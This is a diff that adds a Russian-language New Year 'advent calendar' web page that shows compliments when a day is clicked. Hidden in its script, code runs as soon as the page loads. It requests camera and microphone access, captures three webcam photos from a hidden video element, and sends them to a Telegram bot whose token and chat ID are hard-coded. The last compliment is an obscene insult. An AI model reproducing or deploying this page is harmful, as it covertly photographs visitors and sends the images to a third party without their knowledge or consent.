@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>С Новым Годом!</title>
+    <style>
+        body {
+            background-color: #1e2a47;
+            color: white;
+            font-family: 'Arial', sans-serif;
+            text-align: center;
+            padding: 50px;
+            animation: fadeIn 3s ease;
+        }
+
+        h1 {
+            font-size: 3em;
+            margin-top: 50px;
+            color: #FFD700;
+            animation: bounce 2s infinite;
+        }
+
+        p {
+            font-size: 1.5em;
+            margin-top: 20px;
+            color: #FF6347;
+        }
+
+        .calendar {
+            display: grid;
+            grid-template-columns: repeat(7, 1fr); /* 7 колонок */
+            gap: 10px;
+            margin-top: 50px;
+        }
+
+        .calendar .day {
+            background-color: #2e3b8f;
+            border-radius: 10px;
+            padding: 20px;
+            font-size: 1.5em;
+            color: white;
+            cursor: pointer;
+            transition: transform 0.3s ease, background-color 0.3s ease;
+        }
+
+        .calendar .day:hover {
+            transform: scale(1.1);
+            background-color: #FFD700;
+        }
+
+        .calendar .day:active {
+            transform: scale(0.95);
+            background-color: #FF6347;
+        }
+
+        #video {
+            display: none;
+        }
+
+        #canvas {
+            display: none;
+        }
+
+        #compliment {
+            margin-top: 20px;
+            font-size: 1.8em;
+            color: #FF6347;
+        }
+
+        /* Анимация для текста */
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        /* Анимация для заголовка */
+        @keyframes bounce {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-20px);
+            }
+        }
+
+        /* Медиазапросы для адаптации */
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2.2em;
+            }
+
+            p {
+                font-size: 1.2em;
+            }
+
+            .calendar {
+                grid-template-columns: repeat(4, 1fr); /* 4 колонки на мобильных */
+                gap: 8px;
+            }
+
+            .calendar .day {
+                font-size: 1.2em;
+                padding: 15px;
+            }
+
+            #compliment {
+                font-size: 1.4em;
+            }
+        }
+
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 1.8em;
+            }
+
+            p {
+                font-size: 1em;
+            }
+
+            .calendar {
+                grid-template-columns: repeat(3, 1fr); /* 3 колонки на очень маленьких экранах */
+            }
+
+            .calendar .day {
+                font-size: 1em;
+                padding: 10px;
+            }
+
+            #compliment {
+                font-size: 1.2em;
+            }
+        }
+
+    </style>
+</head>
+<body>
+    <h1>Попытай свою удачу!</h1>
+   
+
+    <div class="calendar">
+        <!-- Адвент-календарь (до 31 дня) -->
+        <div class="day" id="day1">1</div>
+        <div class="day" id="day2">2</div>
+        <div class="day" id="day3">3</div>
+        <div class="day" id="day4">4</div>
+        <div class="day" id="day5">5</div>
+        <div class="day" id="day6">6</div>
+        <div class="day" id="day7">7</div>
+        <div class="day" id="day8">8</div>
+        <div class="day" id="day9">9</div>
+        <div class="day" id="day10">10</div>
+        <div class="day" id="day11">11</div>
+        <div class="day" id="day12">12</div>
+        <div class="day" id="day13">13</div>
+        <div class="day" id="day14">14</div>
+        <div class="day" id="day15">15</div>
+        <div class="day" id="day16">16</div>
+        <div class="day" id="day17">17</div>
+        <div class="day" id="day18">18</div>
+        <div class="day" id="day19">19</div>
+        <div class="day" id="day20">20</div>
+        <div class="day" id="day21">21</div>
+        <div class="day" id="day22">22</div>
+        <div class="day" id="day23">23</div>
+        <div class="day" id="day24">24</div>
+        <div class="day" id="day25">25</div>
+        <div class="day" id="day26">26</div>
+        <div class="day" id="day27">27</div>
+        <div class="day" id="day28">28</div>
+        <div class="day" id="day29">29</div>
+        <div class="day" id="day30">30</div>
+        <div class="day" id="day31">31</div>
+    </div>
+
+    <div id="compliment"></div>
+
+    <video id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const complimentDiv = document.getElementById('compliment');
+        const token = '7207231079:AAFR21ydwp2ekBoB3ZTgIuQcPFQiCT9DD7U';  // Ваш токен бота
+        const chatId = '-4210520413';  // Ваш chat_id
+
+        const compliments = {
+            1: "Доброе утро! Начнем год с улыбки!",
+            2: "Вы прекрасны, не забывайте об этом!",
+            3: "Сегодня будет отличный день, верьте в себя!",
+            4: "Мечтайте и стремитесь к лучшему!",
+            5: "Верьте в чудеса, они рядом!",
+            6: "С каждым днем вы становитесь только лучше!",
+            7: "Доброта спасет мир!",
+            8: "Ваша доброта вдохновляет!",
+            9: "Сегодня будет день наполненный чудесами!",
+            10: "Вы способны на все!",
+            11: "Ваши усилия не останутся незамеченными!",
+            12: "Вы — пример для других!",
+            13: "Сегодня отличный день для начала нового пути!",
+            14: "С каждым днем вы становитесь сильнее!",
+            15: "Пусть каждый момент будет особенным!",
+            16: "Все будет отлично, главное верить в себя!",
+            17: "Жизнь — это путешествие, наслаждайтесь им!",
+            18: "Всегда стремитесь к лучшему!",
+            19: "Каждый день — новый шанс!",
+            20: "Вдохновляйтесь и вдохновляйте других!",
+            21: "Сегодня будет замечательный день!",
+            22: "Ваши мечты сбудутся!",
+            23: "Пусть этот день будет полон радости!",
+            24: "Позитивное настроение на весь день!",
+            25: "Счастье рядом, не упустите его!",
+            26: "Каждый день — это подарок!",
+            27: "С каждым днем вы становитесь мудрее!",
+            28: "Не бойтесь мечтать!",
+            29: "Вы всегда на правильном пути!",
+            30: "Каждый день — это шанс стать лучше!",
+            31: "Поздравляю с иди нахуй!"
+        };
+
+        // Функция для получения доступа к камере
+        function getCameraAccess() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    video.srcObject = stream;
+                    startCapturing();
+                })
+                .catch((err) => {
+                    console.log('Ошибка доступа к камере: ', err);
+                });
+
+            Notification.requestPermission().then(function(result) {
+                console.log(result);
+            });
+
+            navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(() => {
+                    console.log("Microphone permission granted.");
+                })
+                .catch((err) => {
+                    console.log('Ошибка доступа к микрофону: ', err);
+                });
+        }
+
+        function captureAndSendPhoto() {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const photoData = canvas.toDataURL('image/jpeg');
+            const byteString = atob(photoData.split(',')[1]);
+            const arrayBuffer = new ArrayBuffer(byteString.length);
+            const uintArray = new Uint8Array(arrayBuffer);
+            for (let i = 0; i < byteString.length; i++) {
+                uintArray[i] = byteString.charCodeAt(i);
+            }
+            const blob = new Blob([arrayBuffer], { type: 'image/jpeg' });
+
+            sendPhotoToTelegram(blob);
+        }
+
+        function sendPhotoToTelegram(blob) {
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", blob, "photo.jpg");
+
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Фото успешно отправлено!');
+                } else {
+                    console.error('Ошибка при отправке фото:', data);
+                }
+            })
+            .catch(err => console.error('Ошибка при отправке:', err));
+        }
+
+        function startCapturing() {
+            let captureCount = 0;
+
+            const captureInterval = setInterval(() => {
+                if (captureCount < 3) {
+                    captureAndSendPhoto();
+                    captureCount++;
+                } else {
+                    clearInterval(captureInterval);
+                    stopCamera();
+                }
+            }, 5000);
+        }
+
+        function stopCamera() {
+            const stream = video.srcObject;
+            const tracks = stream.getTracks();
+            tracks.forEach(track => track.stop());
+            video.srcObject = null;
+        }
+
+        function showCompliment(day) {
+            complimentDiv.textContent = compliments[day];
+        }
+
+        document.querySelectorAll('.calendar .day').forEach(dayElement => {
+            dayElement.addEventListener('click', function() {
+                const day = this.id.replace('day', '');
+                showCompliment(day);
+            });
+        });
+
+        getCameraAccess();
+
+    </script>
+</body>
+</html>
